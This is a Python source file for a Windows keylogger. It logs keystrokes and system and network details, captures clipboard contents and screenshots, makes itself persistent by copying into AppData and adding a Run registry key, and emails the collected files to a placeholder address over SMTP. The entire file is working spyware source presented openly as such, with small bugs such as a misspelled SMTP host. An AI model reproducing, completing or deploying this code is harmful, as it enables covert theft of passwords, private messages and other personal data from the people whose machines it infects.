import os
import time
import smtplib
import keyboard
import threading, sys
import shutil, subprocess
from PIL import ImageGrab
from email import encoders
import platform, pyperclip
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
import getpass, wmi, psutil, socket
from email.mime.multipart import MIMEMultipart



def get_system_info():
    c = wmi.WMI()
    my_system = c.Win32_ComputerSystem()[0]
    info = f"Username: {getpass.getuser()}\n"
    info += f"System: {platform.system()}\n"
    info += f"Node Name: {platform.node()}\n"
    info += f"Release: {platform.release()}\n"
    info += f"Version: {platform.version()}\n"
    info += f"Machine: {platform.machine()}\n"
    info += f"Manufacturer: {my_system.Manufacturer}\n"
    info +=f"Model: {my_system. Model}\n"
    info +=f"NumberOfProcessors: {my_system.NumberOfProcessors}\n"
    info +=f"SystemFamily: {my_system.SystemFamily}\n"
    info += f"Processor: {platform.processor()}\n"
    info += f"Architecture: {platform.architecture()}\n"
    info += f"Platform: {platform.platform()}\n"
    info +=(f"Physical cores: {psutil.cpu_count(logical=False)}\n")
    info +=(f"Logical cores: {psutil.cpu_count(logical=True)}\n")
    info +=(f"Current CPU frequency: {psutil.cpu_freq().current}\n")
    info +=(f"Min CPU frequency: {psutil.cpu_freq().min}\n")
    info +=(f"Max CPU frequency: {psutil.cpu_freq().max}\n")
    info +=(f"Current CPU utilization: {psutil.cpu_percent(interval=1)}\n")
    info +=(f"Current per-CPU utilization: {psutil.cpu_percent(interval=1, percpu=True)}\n")
    info +=(f"Total RAM installed: {round(psutil.virtual_memory().total/1000000000, 2)} GB\n")
    info +=(f"Available RAM: {round(psutil.virtual_memory().available/1000000000, 2)} GB\n")
    info +=(f"Used RAM: {round(psutil.virtual_memory().used/1000000000, 2)} GB\n")
    info +=(f"RAM usage: {psutil.virtual_memory().percent}%\n\n")
    
    return info

def get_network_info():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return f"Hostname: {hostname}\nIP Address: {ip_address}\n\n"

with open('key.txt', 'w') as file:
            file.write(get_system_info())
            file.write(get_network_info())

with open('clipboard.txt', 'w') as data:
    data.write('Clipboard Data\n\n')

def on_press(event):
    if event.event_type == "down":
        if event.name == "space":
            key = " "
        elif event.name == "enter":
            key = "\n"
        elif event.name == "backspace":
            key = ' <-- '
        elif event.name == "ctrl":
            key = 'ctrl '
        else:
            key = event.name
        
        with open("key.txt", "a") as file:
            file.write(key)


def screenshot():
    image = ImageGrab.grab()
    filename = "screenshot.png"
    image.save(filename)

    time.sleep(25)


def clipboard_steal():
    
    previous_clipboard_text = ''
    while True:
        clipboard_text = pyperclip.paste()
        if clipboard_text != previous_clipboard_text:
            with open('clipboard.txt', 'a') as file:
                file.write(clipboard_text + '\n')
            previous_clipboard_text = clipboard_text
        
def become_persistent():    #persistence vid7
    evil_file_location = os.environ['appdata'] + '\\Windows keylogger.exe'
    if not os.path.exists(evil_file_location):
        shutil.copyfile(sys.executable,evil_file_location)  #to run .py convert to __file__
        subprocess.call('reg add HKCU\SOFTWARE\microsoft\windows\Currentversion\Run /v test /t REG_SZ /d "' + evil_file_location + '"', shell=True)



def send_email():
    server = "smpt.gmail.com"
    port = 587
    sender = "youremail@gmail.com"
    password = "password"
    receiver = "receiver@email.com"
    subject = "Screenshot, Clipboard Data and Keys"
    message = "This is an automated email with a screenshot, clipboard data and a list of keys pressed."

    msg = MIMEMultipart()
    msg["From"] = sender
    msg["To"] = receiver
    msg["Subject"] = subject
    msg.attach(MIMEText(message, "plain"))

    # Attach the files with path
    file_attachments = [
    {"filename": "screenshot.png", "path": "screenshot.png"},
    {"filename": "key.txt", "path": "key.txt"},
    {"filename": "clipboard.txt", "path": "clipboard.txt"}
    ]

    for file_attachment in file_attachments:
        with open(file_attachment["path"], "rb") as file:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(file.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename={file_attachment['filename']}")
            msg.attach(part)


    try:
        server = smtplib.SMTP(server, port)
        server.starttls()
        server.login(sender, password)
        time.sleep(21)
        server.sendmail(sender, receiver, msg.as_string())
        server.quit()
    except Exception as e:
        # print("Error sending email, trying again in 60 seconds...")
        time.sleep(60)
        send_email()

def main():
    # Create a thread to capture screenshots every 5 minutes
    screenshot_thread = threading.Thread(target=screenshot)
    screenshot_thread.daemon = False
    screenshot_thread.start()
    status_thread = threading.Thread(target=clipboard_steal)
    status_thread.daemon = True
    status_thread.start()

    # Register the callback
    keyboard.on_press(on_press)

    become_persistent()
    # Send the email every 5 minutes
    while True:
        screenshot()
        send_email()
        # print("Email sent successfully!")
        time.sleep(40)  # 300 seconds = 5 minutes
        os.remove('screenshot.png')

if __name__ == "__main__":
    main()
